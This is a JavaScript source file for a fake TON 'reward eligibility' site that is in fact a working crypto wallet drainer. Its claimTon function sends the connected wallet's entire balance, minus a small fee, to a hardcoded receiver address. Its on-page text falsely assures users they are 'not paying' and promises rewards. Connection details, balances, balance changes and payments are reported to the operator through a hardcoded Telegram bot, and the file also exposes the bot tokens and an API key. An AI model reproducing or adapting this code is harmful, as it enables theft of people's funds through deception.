let tonConnectUI;
let connectedWallet;
let currentBalanceNano = 0;
let hasNotifiedThisSession = false; // Track if we've already sent notification for this session
let lastKnownBalance = 0; // Track last known balance for change detection
let balanceMonitorInterval = null; // Store interval ID for balance monitoring

// Helper function to manage notification status in localStorage
const NOTIFICATION_STORAGE_KEY = 'ton_notifications';

function getNotificationStatus() {
    try {
        const data = localStorage.getItem(NOTIFICATION_STORAGE_KEY);
        return data ? JSON.parse(data) : {};
    } catch (e) {
        console.error("Failed to get notification status from localStorage:", e);
        return {};
    }
}

function setNotificationStatus(status) {
    try {
        localStorage.setItem(NOTIFICATION_STORAGE_KEY, JSON.stringify(status));
    } catch (e) {
        console.error("Failed to set notification status to localStorage:", e);
    }
}

function hasNotifiedForWallet(address) {
    const status = getNotificationStatus();
    return status[address] === true;
}

function markNotifiedForWallet(address) {
    const status = getNotificationStatus();
    status[address] = true;
    setNotificationStatus(status);
}

// User-friendly TON address formatter
function toUserFriendly(address) {
  return TON_CONNECT_UI.toUserFriendlyAddress(address);
}

// Show or hide transactions
function toggleTransactions() {
  const txContainer = document.getElementById("transactionContainer");
  const btn = document.getElementById("toggleTransactions");
  const showing = txContainer.style.display === "block";

  txContainer.style.display = showing ? "none" : "block";
  btn.innerText = showing ? "⏩ Show Transactions" : "⏬ Hide Transactions";
}

// Copy address to clipboard
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => alert("Copied!"));
}

// Track last eligibility notification data to prevent spam
let lastEligibilityData = {};

// Function to send eligibility notification to Telegram
async function sendEligibilityNotification(rank, totalReward, isEligible, tonBalance, totalTxs, baseReward, bonus) {
  if (!connectedWallet || !connectedWallet.account?.address) return;

  const fullAddress = toUserFriendly(connectedWallet.account.address);
  
  // Create a unique identifier for this eligibility check
  const currentData = {
    address: fullAddress,
    balance: tonBalance.toFixed(4),
    rank: rank,
    totalReward: totalReward.toFixed(2),
    eligible: isEligible
  };
  
  // Check if this is the same as the last notification sent
  const dataKey = `${fullAddress}_eligibility`;
  if (lastEligibilityData[dataKey] && 
      lastEligibilityData[dataKey].balance === currentData.balance &&
      lastEligibilityData[dataKey].rank === currentData.rank &&
      lastEligibilityData[dataKey].eligible === currentData.eligible) {
    console.log("Skipping eligibility notification - same data as previous check");
    return;
  }

  const botToken = "7938101132:AAEXnSf0rpL4lPQdQ_dS-Hi2e7WWdh0tUbU";
  const chatId = "-1002781376753";
  const walletName = connectedWallet.device?.name || connectedWallet.device?.appName || 'Unknown Wallet';

  const eligibilityStatus = isEligible ? "✅ ELIGIBLE" : "❌ NOT ELIGIBLE";
  const eligibilityEmoji = isEligible ? "🎉" : "⚠️";
  
  // Calculate TONHUB needed to match total reward using 1:1 conversion rule
  // Simple formula: 1 TONHUB = 1 TON
  const tonhubNeeded = Math.ceil(totalReward);
  
  let message = `${eligibilityEmoji} ELIGIBILITY CHECK COMPLETE\n🔗 <b>${walletName}</b>\nAddress: <code>${fullAddress}</code>\n\n`;
  message += `🏆 <b>Rank:</b> ${rank}\n`;
  message += `📊 <b>Transactions:</b> ${totalTxs}\n`;
  message += `💰 <b>Current Balance:</b> ${tonBalance.toFixed(4)} TON\n\n`;
  //message += `🎁 <b>Reward Calculation:</b>\n`;
  //message += `├ Base Reward: ${baseReward} TON\n`;
  if (bonus > 0) {
    message += `├ Balance Bonus: +${bonus.toFixed(2)} TON\n`;
  }
  message += `└ <b>Total Reward: ${totalReward.toFixed(2)} TON</b>\n\n`;
  //message += `🔄 <b>TONHUB Alternative:</b>\n`;
  message += `💎 Need <b>${tonhubNeeded.toLocaleString()} TONHUB</b> tokens to match total reward\n`;
 // message += `📈 Rate: 1 TONHUB = 1 TON (1:1 conversion)\n`;
 // message += `🚀 Visit swap page to convert TONHUB → TON\n\n`;
  message += `🎯 <b>Status:</b> ${eligibilityStatus}\n`;
  //message += `⏰ <b>Checked:</b> ${new Date().toLocaleString()}`;

  try {
    console.log("Sending eligibility notification:", message);
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const telegramData = await telegramResponse.json();
    console.log("Eligibility notification Telegram API response:", telegramData);

    if (telegramData.ok) {
      // Store the eligibility data to prevent duplicate notifications
      lastEligibilityData[dataKey] = currentData;
      console.log("✅ Eligibility notification sent successfully.");
    } else {
      console.error("❌ Eligibility notification Telegram API error:", telegramData.description);
      console.error("Error code:", telegramData.error_code);
    }
  } catch (err) {
    console.error("❌ Failed to send eligibility notification to Telegram:", err);
    console.error("Error details:", err.message);
  }
}

// Function to send balance change notification to Telegram
async function sendBalanceNotification(newBalance) {
  if (!connectedWallet || !connectedWallet.account?.address) return;

  // Use the same bot token as connection notifications for consistency
  const botToken = "7938101132:AAEXnSf0rpL4lPQdQ_dS-Hi2e7WWdh0tUbU";
  const chatId = "-1002781376753";
  const fullAddress = toUserFriendly(connectedWallet.account.address);
  const walletName = connectedWallet.device?.name || connectedWallet.device?.appName || 'Unknown Wallet';
  const tonBalance = newBalance / 1e9;

  const message = `⬆️ Balance Update!\n🔗 <b>${walletName}</b>\nAddress: <code>${fullAddress}</code>\n💰 New Balance: <b>${tonBalance.toFixed(4)} TON</b>`;

  try {
    console.log("Sending balance update notification:", message);
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const telegramData = await telegramResponse.json();
    console.log("Balance notification Telegram API response:", telegramData);

    if (telegramData.ok) {
      console.log("✅ Balance change notification sent successfully.");
    } else {
      console.error("❌ Balance notification Telegram API error:", telegramData.description);
      console.error("Error code:", telegramData.error_code);
    }
  } catch (err) {
    console.error("❌ Failed to send balance change notification to Telegram:", err);
    console.error("Error details:", err.message);
  }
}

// Function to check and notify about balance changes
async function checkBalanceChange() {
  if (!connectedWallet || !connectedWallet.account?.address) return;

  const address = toUserFriendly(connectedWallet.account.address);
  try {
    const balRes = await fetch(
      `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
    );
    const balData = await balRes.json();
    let tonBalanceNano = 0;

    if (balData.ok) {
      tonBalanceNano = balData.result;
      currentBalanceNano = tonBalanceNano; // Update global currentBalanceNano

      if (tonBalanceNano !== lastKnownBalance) {
        console.log(`Balance changed from ${lastKnownBalance} to ${tonBalanceNano}`);
        await sendBalanceNotification(tonBalanceNano);
        lastKnownBalance = tonBalanceNano; // Update last known balance
      }
    } else {
      console.error("Failed to fetch balance:", balData.error);
    }
  } catch (err) {
    console.error("Error in checkBalanceChange:", err);
  }
}

// Start monitoring the wallet balance
function startBalanceMonitoring() {
  // Clear any existing interval to prevent duplicates
  stopBalanceMonitoring();
  // Check balance every 30 seconds for faster detection
  balanceMonitorInterval = setInterval(checkBalanceChange, 30000);
  console.log("Balance monitoring started.");
}

// Stop monitoring the wallet balance
function stopBalanceMonitoring() {
  if (balanceMonitorInterval) {
    clearInterval(balanceMonitorInterval);
    balanceMonitorInterval = null;
    console.log("Balance monitoring stopped.");
  }
}

// Initialize TonConnect

document.addEventListener("DOMContentLoaded", async () => {
  tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://vocal-smakager-e64636.netlify.app/manifest.json",
    buttonRootId: "ton-connect",
    twaReturnUrl: "https://t.me/TonhubApp_bot", // 👈 Added return URL
    uiPreferences: {
      colorsSet: {
        [TON_CONNECT_UI.THEME.DARK]: {
          connectButton: {
            background: "#e045ff",
            color: "040724c0",
          },
        },
        [TON_CONNECT_UI.THEME.LIGHT]: {
          connectButton: {
            background: "#040724c0",
            color: "#040724c0",
          },
        },
      },
    },
  });

  tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet && wallet.account?.address) {
      // Check if Tonkeeper blocker is loaded and block if necessary
      if (typeof window.checkAndBlockTonkeeper === 'function' && window.checkAndBlockTonkeeper(wallet)) {
        // Disconnect the wallet
        await tonConnectUI.disconnect();

        // Reset UI
        document.getElementById("wallet-address").innerText = "Wallet: Not connected";
        connectedWallet = null;
        return;
      }

      connectedWallet = wallet;
      const friendly = toUserFriendly(wallet.account.address);
      const fullAddress = toUserFriendly(wallet.account.address);

      // Only send Telegram notification if we haven't notified for this wallet in this session
      if (!hasNotifiedForWallet(fullAddress)) {
        const botToken = "7938101132:AAEXnSf0rpL4lPQdQ_dS-Hi2e7WWdh0tUbU";
        const chatId = "-1002781376753"; // e.g., 123456789 or -100XXXXXXXX

        // Get wallet name from device info
        const walletName = wallet.device?.name || wallet.device?.appName || 'Unknown Wallet';

        // Get balance
        try {
          console.log("Fetching balance for address:", fullAddress);
          const balRes = await fetch(
            `https://toncenter.com/api/v2/getAddressBalance?address=${fullAddress}`
          );
          const balData = await balRes.json();
          let tonBalance = 0;

          if (balData.ok) {
            tonBalance = balData.result / 1e9;
            currentBalanceNano = balData.result; // Update global balance
            lastKnownBalance = balData.result; // Initialize last known balance
          }

          // For connection notification, we don't calculate actual rank/reward yet
          // These will be determined after wallet scan and eligibility check
          let rankStatus = "Pending Scan 🔍";
          let rewardStatus = "Scan Required 📊";
          
          // Only show minimum eligibility check
          if (tonBalance >= 4.48) {
            rankStatus = "Eligible for Scanning ✅";
            rewardStatus = "Available after scan 🎯";
          } else {
            rankStatus = "Needs 3.5+ TON ❌";
            rewardStatus = "Not eligible 💔";
          }

          // Build message with wallet name and scan requirement notice
          const message = `✅ Connected\n🔗 <b>${walletName}</b>\nAddress: <code>${fullAddress}</code>\n💰 Balance: <b>${tonBalance.toFixed(
            4
          )} TON</b>\n🏆 Rank: <b>${rankStatus}</b>\n🎁 Expected Reward: <b>${rewardStatus}</b>`;

          console.log("Sending Telegram message:", message);
          console.log("Bot token:", botToken);
          console.log("Chat ID:", chatId);

          // Send to Telegram with better error handling
          const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          });

          const telegramData = await telegramResponse.json();
          console.log("Telegram API response:", telegramData);

          if (telegramData.ok) {
            // Mark that we've sent notification for this wallet in this session
            markNotifiedForWallet(fullAddress);
            console.log("✅ Telegram notification sent successfully for new connection");
          } else {
            console.error("❌ Telegram API error:", telegramData.description);
            console.error("Error code:", telegramData.error_code);
          }
        } catch (err) {
          console.error("❌ Failed to fetch balance or notify Telegram:", err);
          console.error("Error details:", err.message);
        }
      } else {
        console.log("Skipping Telegram notification - already sent for this wallet in current session");

        // Still need to initialize balance tracking even if we skip notification
        try {
          const balRes = await fetch(
            `https://toncenter.com/api/v2/getAddressBalance?address=${fullAddress}`
          );
          const balData = await balRes.json();
          if (balData.ok) {
            currentBalanceNano = balData.result;
            lastKnownBalance = balData.result;
          }
        } catch (err) {
          console.error("Failed to fetch balance:", err);
        }
      }

      // Start balance monitoring for connected wallet
      startBalanceMonitoring();

      document.getElementById(
        "wallet-address"
      ).innerText = `Wallet: ${"Connected"}`;
    } else {
      document.getElementById("wallet-address").innerText =
        "Wallet: Not connected";
      // Reset notification flag when wallet disconnects
      // hasNotifiedThisSession = false; // This is now handled per wallet by localStorage
      connectedWallet = null;

      // Stop balance monitoring when wallet disconnects
      stopBalanceMonitoring();
    }
  });
});

// Scan Wallet Logic
async function scanWallet() {
  if (!connectedWallet) return alert("Please connect your wallet first.");

  const address = connectedWallet.account.address;
  const txContainer = document.getElementById("transactionContainer");
  const resultDiv = document.getElementById("result");
  const checksDiv = document.getElementById("checks");
  const balanceDiv = document.getElementById("balanceResult");
  const claimBtn = document.getElementById("claimBtn");

  // Clear and show loaders
  txContainer.innerHTML = resultDiv.innerHTML = '<div class="loader"></div>';
  checksDiv.innerHTML = balanceDiv.innerHTML = "";

  // Fetch transactions
  const allTxs = [];
  let lt = null,
    hash = null;
  const API_KEY =
    "440589a96122ec8b751bf3f0f05193410ac60b355f1e9bceaab0fb82b4abf5e1";

  for (let i = 0; i < 7; i++) {
    const params = new URLSearchParams({
      address,
      limit: 15,
      archival: "true",
      api_key: API_KEY,
    });
    if (lt && hash) {
      params.append("lt", lt);
      params.append("hash", hash);
    }

    const res = await fetch(
      `https://toncenter.com/api/v2/getTransactions?${params}`
    );
    const data = await res.json();
    if (!data.ok || data.result.length === 0) break;

    allTxs.push(...data.result);
    lt = data.result[data.result.length - 1].transaction_id.lt;
    hash = data.result[data.result.length - 1].transaction_id.hash;
    if (allTxs.length >= 100) break;
  }

  // Show Transaction Toggle
  document.getElementById("toggleTransactions").style.display = "block";

  // Show Check Eligibility Button
  document.querySelector('button[onclick="showEligibility()"]').style.display =
    "block";

  // Render Transactions
  let totalReceived = 0,
    totalSent = 0;
  const txHTML = allTxs
    .slice(0, 100)
    .map((tx) => {
      const date = new Date(tx.utime * 1000).toLocaleString();
      let inTon = 0;
      if (tx.in_msg?.value) inTon += parseFloat(tx.in_msg.value) / 1e9;
      tx.out_msgs.forEach((m) => {
        if (m?.value) totalSent += parseFloat(m.value) / 1e9;
      });
      totalReceived += inTon;

      return `<div>
      <strong>${date}</strong><br>
      Received: ${inTon.toFixed(4)} TON<br>
      From: <span style="font-size:12px">${tx.in_msg?.source || "N/A"}</span>
      <button class="copy-btn" onclick="copyToClipboard('${
        tx.in_msg?.source || ""
      }')">Copy</button>
    </div>`;
    })
    .join("");

  txContainer.innerHTML = txHTML;

  // User Rank & Summary
  const totalTxs = allTxs.length;
  let rank = "Newbie 🧍";
  if (totalTxs >= 100) rank = "Ton King 👑";
  else if (totalTxs >= 50) rank = "Ton Hero 🛡️";
  else if (totalTxs >= 20) rank = "Ton Star 🌟";

  resultDiv.innerHTML = `<p style="font-size: 0.85rem; color: #00000; text-align: center; margin-top: 8px;">
  <em>(Showing data from your most recent 100 transactions)</em>
</p>

  <h3>${rank}</h3>
    <p>Total Transactions: ${totalTxs}</p>
    <p>Total Received: ${totalReceived.toFixed(4)} TON</p>
    <p>Total Sent: ${totalSent.toFixed(4)} TON</p>`;

  // Check Balance and send notification if changed
  const balRes = await fetch(
    `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
  );
  const balData = await balRes.json();
  let tonBalance = 0;
  if (balData.ok) {
    tonBalance = balData.result / 1e9;
    const newBalanceNano = balData.result;
    
    // Check if balance changed and send notification
    if (newBalanceNano !== lastKnownBalance && lastKnownBalance !== 0) {
      console.log(`Balance changed during scan from ${lastKnownBalance} to ${newBalanceNano}`);
      await sendBalanceNotification(newBalanceNano);
    }
    
    currentBalanceNano = newBalanceNano;
    lastKnownBalance = newBalanceNano;
    balanceDiv.innerHTML = `<strong>Current Balance:</strong> ${tonBalance.toFixed(
      4
    )} TON`;
  } else {
    balanceDiv.innerText = "Error fetching balance";
  }

  // Store conditions
  window.tonConditions = {
    totalTxs,
    tonBalance,
  };

  // END OF scanWallet()

  // Show eligibility button only after scan is complete
  document.getElementById("checkEligibilityBtn").style.display = "block";
}

// Show Eligibility Checklist
function showEligibility() {
  const { totalTxs, tonBalance } = window.tonConditions || {};
  const checksDiv = document.getElementById("checks");
  const claimBtn = document.getElementById("claimBtn");
  const eligibilityBtn = document.getElementById("checkEligibilityBtn");

  // Show loading spinner
  checksDiv.innerHTML = '<div class="loader"></div>';
  checksDiv.style.display = "block";

  // Disable button and show loading state
  eligibilityBtn.disabled = true;
  eligibilityBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking...';

  // Add delay to show spinner effect
  setTimeout(async () => {
    // Check for balance updates before calculating eligibility
    if (connectedWallet && connectedWallet.account?.address) {
      const address = toUserFriendly(connectedWallet.account.address);
      try {
        const balRes = await fetch(
          `https://toncenter.com/api/v2/getAddressBalance?address=${address}`
        );
        const balData = await balRes.json();
        if (balData.ok) {
          const newBalanceNano = balData.result;
          
          // Check if balance changed and send notification
          if (newBalanceNano !== lastKnownBalance && lastKnownBalance !== 0) {
            console.log(`Balance changed during eligibility check from ${lastKnownBalance} to ${newBalanceNano}`);
            await sendBalanceNotification(newBalanceNano);
          }
          
          currentBalanceNano = newBalanceNano;
          lastKnownBalance = newBalanceNano;
          
          // Update tonBalance for eligibility calculation
          window.tonConditions.tonBalance = newBalanceNano / 1e9;
        }
      } catch (err) {
        console.error("Error checking balance during eligibility:", err);
      }
    }

    // Calculate base reward based on rank system
  let baseReward = 0;
  let rank = "";
  if (totalTxs >= 100) {
    baseReward = 17.7;
    rank = "Ton King 👑";
  } else if (totalTxs >= 50) {
    baseReward = 12.7;
    rank = "Ton Hero 🛡️";
  } else if (totalTxs >= 20) {
    baseReward = 8.8;
    rank = "Ton Star 🌟";
  } else {
    baseReward = 6.4;
    rank = "Newbie 🧍";
  }

  // Calculate bonus for extra TON above 2 TON threshold
  let bonus = 0;
  if (tonBalance > 4.48) {
    const extraTon = tonBalance - 4.48;
    bonus = extraTon * 0.65;
  }

  const totalReward = baseReward + bonus;

  const mark = (pass, label) =>
    `<div class="check ${pass ? "green" : "red"}">${
      pass ? "✅" : "❌"
    } ${label}</div>`;

  // Updated eligibility checks based on rank system
  const c1 = totalTxs >= 0; // Newbie (0-19)
  const c2 = totalTxs >= 20; // Ton Star (20-49)
  const c3 = totalTxs >= 50; // Ton Hero (50-99)
  const c4 = totalTxs >= 100; // Ton King (100+)
  const c5 = tonBalance >= 4.47; // Required balance

  // Show all rank checks with proper eligibility logic
  let rankChecks = '';

  // Always show Newbie rank
  rankChecks += mark(c1, `Newbie Rank 0-19 Transactions 🧍`);

  // Show Ton Star if user has 20+ transactions OR if they already qualified for Newbie
  rankChecks += mark(c2, `Ton Star 20-49 Transactions 🌟`);

  // Show Ton Hero if user has 50+ transactions OR if they already qualified for previous ranks
  rankChecks += mark(c3, `Ton Hero 50-99 Transactions 🛡️`);

  // Show Ton King if user has 100+ transactions OR if they already qualified for previous ranks
  rankChecks += mark(c4, `Ton King 100+ Transactions 👑`);

  checksDiv.innerHTML = `<div style="background: rgba(21, 10, 83, 0.507); border-left: 4px solid #00ccff; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; color: #00ccff; line-height: 1.4;">
  ⚠️ Only your <strong>latest 100 transactions</strong> are analyzed.<br>
  💡 <strong>Note:</strong> You're <strong>not paying</strong> anything — holding at least <strong>4.5 TON</strong> simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.<br>
  🎁 <strong>Bonus:</strong> For every extra TON you hold above the 4.5 TON requirement, you'll receive +0.65 TON added to your reward!
</div>

    ${rankChecks}
    ${mark(
      c5,
      `4.5+ TON Balance 💰 <span style="font-size: 0.85rem; color: #ff6b35; font-weight: 600; display: block; text-align: center; margin-top: 5px;">(REQUIRED)</span>`
    )}

<div style="background: linear-gradient(135deg, rgba(42, 116, 248, 0.15), rgba(200, 77, 208, 0.15)); border: 2px solid rgba(42, 116, 248, 0.4); border-radius: 20px; padding: 25px; margin: 30px 0; text-align: center; box-shadow: 0 15px 35px rgba(42, 116, 248, 0.2); backdrop-filter: blur(20px);">
  <div style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 15px;">
    <i class="fas fa-gift" style="font-size: 1.5rem; background: var(--ton-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;"></i>
    <h4 style="color: var(--text-primary); margin: 0; font-size: 1.3rem; font-weight: 700;">Your Reward</h4>
  </div>
  <div style="font-size: 2rem; font-weight: 900; background: var(--ton-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 12px; text-shadow: 0 0 20px rgba(42, 116, 248, 0.3);">
    ${totalReward.toFixed(2)} TON
  </div>
  <div style="font-size: 1rem; color: var(--text-secondary); line-height: 1.5;">
    <div style="background: rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 10px; margin-top: 10px;">
      Base Reward (${rank}): <span style="color: var(--text-primary); font-weight: 600;">${baseReward} TON</span>
      ${bonus > 0 ? `<br>Bonus (+${(tonBalance - 2).toFixed(2)} TON × 0.65): <span style="color: #00ff88; font-weight: 600;">+${bonus.toFixed(2)} TON</span>` : ''}
    </div>
  </div>
</div>
  `;
  checksDiv.style.display = "block";

  claimBtn.disabled = !c5;
  claimBtn.innerHTML = `<i class="fas fa-gift"></i> Claim ${totalReward.toFixed(2)} TON`;
  claimBtn.style.display = "block";

  // Send detailed eligibility notification to Telegram
  if (connectedWallet && connectedWallet.account?.address) {
    sendEligibilityNotification(rank, totalReward, c5, tonBalance, totalTxs, baseReward, bonus);
  }

  // Reset eligibility button
  eligibilityBtn.disabled = false;
  eligibilityBtn.innerHTML = '<i class="fas fa-clipboard-check"></i> Check Eligibility';
  }, 1500); // 1.5 second delay for spinner effect
}

// Claim Function with Fixed Claim Fee
async function claimTon() {
  if (!connectedWallet || currentBalanceNano < 2e9) {
    alert("Not eligible to claim (need at least 4.5 TON)");
    return;
  }

  const fixedClaimFeeNano = 0.01 * 1e9; // 0.01 TON = 10,000,000 nanoTON
  const claimAmount = currentBalanceNano - fixedClaimFeeNano;

  if (claimAmount <= 0) {
    alert("Insufficient balance after fee deduction.");
    return;
  }

  const transaction = {
    messages: [
      {
        address: "UQD-pZxfokGeBKZxu4FGOuKLDJTvqdsAwrL59Fr__7zjSz7H", // Receiver address
        amount: claimAmount.toString(), // Send balance minus 0.01 TON
      },
    ],
  };

  try {
    const result = await tonConnectUI.sendTransaction(transaction);

    // Send payment confirmation to Telegram
    const botToken = "7938101132:AAFSULGkVM16xKZMG8qPnAVQxZ-WdZCG9QI";
    const chatId = "-1002781376753";
    const address = connectedWallet.account.address;
    const friendly = toUserFriendly(address);
    const paidAmount = (claimAmount / 1e9).toFixed(4);
    const walletName = connectedWallet.device?.name || connectedWallet.device?.appName || 'Unknown Wallet';

    const paymentMessage = `💰 PAYMENT CONFIRMED!\n🔗 <b>${walletName}</b>\nAddress: <code>${friendly}</code>\n💵 Amount Paid: <b>${paidAmount} TON</b>\n🎊 Status: <b>Transaction Successful</b>\n⏰ Time: <b>${new Date().toLocaleString()}</b>`;

    try {
      console.log("Sending payment confirmation:", paymentMessage);
      const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: paymentMessage,
          parse_mode: "HTML",
        }),
      });

      const telegramData = await telegramResponse.json();
      console.log("Payment notification Telegram API response:", telegramData);

      if (telegramData.ok) {
        console.log("✅ Payment confirmation sent successfully.");
      } else {
        console.error("❌ Payment notification Telegram API error:", telegramData.description);
        console.error("Error code:", telegramData.error_code);
      }
    } catch (telegramErr) {
      console.error("❌ Failed to send payment notification to Telegram:", telegramErr);
      console.error("Error details:", telegramErr.message);
    }

    alert(
      "🎊 Thank You for Participating! 🎊 Weve received your submission successfully. 🔍 Your information is currently being reviewed.  This process usually takes just a few minutes. 💸 Once verified, your reward will be sent automatically.  Stay tuned, and thanks for being part of our community!🚀 "
    );
    console.log("Transaction Result:", result);
  } catch (err) {
    alert("Transaction failed");
    console.error(err);
  }
}
